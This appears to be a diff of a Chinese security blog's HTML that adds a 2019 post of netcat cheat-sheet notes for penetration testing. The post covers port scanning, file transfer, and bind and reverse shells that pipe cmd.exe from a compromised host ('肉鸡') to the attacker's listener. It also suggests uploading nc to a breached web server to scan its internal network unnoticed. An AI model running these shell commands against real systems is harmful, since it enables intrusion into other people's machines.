@@ -22,7 +22,7 @@
     <meta name="description" content>
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>XYTK&#39;s Blog</title>
+    <title>工具-netcat · XYTK&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -203,12 +203,23 @@
 </head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >XYTK&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">工具-netcat</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>XYTK's Blog</a>
 </header>
@@ -220,24 +231,74 @@
 
 
 
+
+height:50vh;
 ">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            工具-netcat
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "tools">tools</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">764</span>Reading time: <span class="post-count reading-time">2 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/10/19</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -338,44 +399,93 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/10/07/Python实现SPN加解密/" >
-            
-                <span>【转载】Python实现SPN加解密</span>
-        </a>
-        <div class="abstract-content">
-            前言原文地址：https://gooong.cn/post/cryptography-part1/
-SPN网络难道不是要介绍AES吗，怎么会变成SPN网络，这是啥？可以吃吗？  
-AES、DES等很多现代对称加密方法的核心就是SPN网络，它是代换-置换网络（Substitution-Permutation Network）的缩写,是现代对称加密方法设计的蓝本。可以说，了解SPN网络，就基本了解了AES。  
-很巧的是，这个网络正好是容易理解的。SPN网络的思想很简单：既然加密一次不够安全，那我就加密多次，把第一次加密产生的密文再进行加密，解密的时候我连续进行两次解密就可以了，这样是不是就...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/10/07</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "python">python</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "Crypto">Crypto</a>
-    
-</div>
-            
-        </div>
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="工具系列"><a href="#工具系列" class="headerlink" title="工具系列"></a>工具系列</h1><p>完整的渗透测试过程中，工具能够提供很多帮助，但一段时间不用之后就会忘记，用的时候又需要重新查，很麻烦。于是，就有了这个系列。</p>
+<hr>
+<h1 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h1><p>Netcat 常称为 nc，拥有“瑞士军刀”的美誉。nc 小巧强悍，可以读写TCP或UDP网络连接，它被设计成一个可靠的后端工具，能被其它的程序或脚本直接驱动。同时，它又是一个功能丰富的网络调试和开发工具，因为它可以建立你可能用到的几乎任何类型的连接，以及一些非常有意思的内建功能，它基于socket协议工作。在渗透测试领域，我们通常利用它来反弹shell。</p>
+<h1 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h1><blockquote>
+<p>-l： 开启监听<br>-p：指定端口<br>-t： 以telnet形式应答<br>-e：程序重定向<br>-n：以数字形式表示ip<br>-v：显示执行命令过程<br>-z :  不进行交互，直接显示结果<br>-u ：使用UDP协议传输<br>-w :  设置超时时间</p>
+</blockquote>
+<h1 id="用法实例"><a href="#用法实例" class="headerlink" title="用法实例"></a>用法实例</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>如果是想单纯的端口扫描的话，利用其它工具比如 nmap会更好。nc端口扫描最主要的用途是，当我们获得了一个网站的权限之后，我们想再渗透进该网站的内网进行渗透。然而，我们的nmap工具是不能扫描到内网的，所以这时我们可以把nc上传到web服务器上，利用它来扫描内网主机。而由于nc体积很小，所以不容易被发现。</p>
+<blockquote>
+<p>nc  -z -v -n 192.168.10.14  20-23   #端口或端口范围</p>
+</blockquote>
+<p>如果探测到端口开放了，比如上面的 80 端口开放了，我们就可以继续探测其banner信息： </p>
+<blockquote>
+<p>nc -v -n 192.168.10.14  80<br>然后输入get</p>
+</blockquote>
+<h2 id="实现简易聊天"><a href="#实现简易聊天" class="headerlink" title="实现简易聊天"></a>实现简易聊天</h2><p>一端监听，一端发送。简易的C/S架构。</p>
+<blockquote>
+<p>服务器端：<br>nc   -lvp    8888      #监听8888端口  -l 监听 -v 显示详细信息  -p 指定端口</p>
+</blockquote>
+<blockquote>
+<p>客户端：<br>nc  -nv  10.96.10.208  8888    #连接到服务器的8888端口  -n以数字形式显示ip  -v显示详细信息</p>
+</blockquote>
+<h2 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h2><blockquote>
+<p>服务器端：<br>nc  -lvp  8888 &lt; test.txt</p>
+</blockquote>
+<blockquote>
+<p>客户端：<br>nc -nv 10.96.10.208 8888 &gt;test.txt</p>
+</blockquote>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p>意思就是我们主动连接肉鸡</p>
+<p>假如我们现在入侵到了一台主机上，我们可以通过执行以下命令将该主机的cmd命令弹到8888端口上</p>
+<p>肉鸡</p>
+<blockquote>
+<p>nc -lv -p 8888 -t -e cmd.exe</p>
+</blockquote>
+<p>我们的主机</p>
+<blockquote>
+<p>nc  -nv  192.168.10.14  8888            #我们的主机访问该肉鸡的8888端口</p>
+</blockquote>
+<h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><p>意思就是我们监听端口，然后肉鸡主动连接到我们的主机</p>
+<p>我们的主机</p>
+<blockquote>
+<p>nc  -lvp  8888</p>
+</blockquote>
+<p>肉鸡</p>
+<blockquote>
+<p>nc  -t -e cmd.exe 10.96.10.208 8888</p>
+</blockquote>
+<h2 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐(?)"></a>蜜罐(?)</h2><p>一直监听8888端口，知道 ctrl+C 停止</p>
+<p>​​​​​​​&gt; nc  -L -p  8888  &gt; log.txt   #监听8888端口，并且将日志信息写入log.txt中</p>
+
     </article>
+    <!-- license  -->
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2019/10/20/PHP无参数实现RCE/" title= "PHP无参数实现RCE">
+                    <div class="nextTitle">PHP无参数实现RCE</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/10/19/【wp】bugku-login4-CBC字节翻转攻击/" title= "【wp】bugku-login4&CBC字节翻转攻击">
+                    <div class="prevTitle">【wp】bugku-login4&CBC字节翻转攻击</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -471,6 +581,24 @@ AES、DES等很多现代对称加密方法的核心就是SPN网络，它是代�
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#工具系列"><span class="toc-number">1.</span> <span class="toc-text">工具系列</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Netcat"><span class="toc-number">2.</span> <span class="toc-text">Netcat</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#常用参数"><span class="toc-number">3.</span> <span class="toc-text">常用参数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#用法实例"><span class="toc-number">4.</span> <span class="toc-text">用法实例</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#端口扫描"><span class="toc-number">4.1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实现简易聊天"><span class="toc-number">4.2.</span> <span class="toc-text">实现简易聊天</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件传输"><span class="toc-number">4.3.</span> <span class="toc-text">文件传输</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反弹shell"><span class="toc-number">4.4.</span> <span class="toc-text">反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#正向连接"><span class="toc-number">4.4.1.</span> <span class="toc-text">正向连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#反向连接"><span class="toc-number">4.4.2.</span> <span class="toc-text">反向连接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#蜜罐"><span class="toc-number">4.5.</span> <span class="toc-text">蜜罐(?)</span></a></li></ol></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -750,6 +878,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
